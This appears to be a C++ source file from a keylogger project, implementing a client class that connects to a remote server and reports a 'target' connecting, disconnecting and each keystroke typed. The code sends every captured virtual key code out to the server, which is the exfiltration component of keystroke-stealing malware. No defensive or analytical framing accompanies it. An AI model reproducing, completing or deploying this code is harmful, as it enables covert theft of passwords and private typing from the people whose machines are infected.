#include "client_keylogger.h"
#include "common.h"

client_keylogger::client_keylogger(uint64_t(*scrambleFunc)(uint64_t))
	:kq::client_interface<messageType>(scrambleFunc)
{



}

client_keylogger::~client_keylogger()
{
	kq::message<messageType> msg(messageType::targetDisconnected);
	Send(msg);
	Disconnect();
}

void client_keylogger::connctInnit()
{
	if (!Connect(server_ip, server_port))
	{
		return;
	}
	kq::message<messageType> msg(messageType::targetConnected);

	Send(msg);
}

void client_keylogger::sendKeyStroke(DWORD virtualKeyCode)
{
	kq::message<messageType> msg(messageType::targetTyped);
	msg << virtualKeyCode;
	Send(msg);
}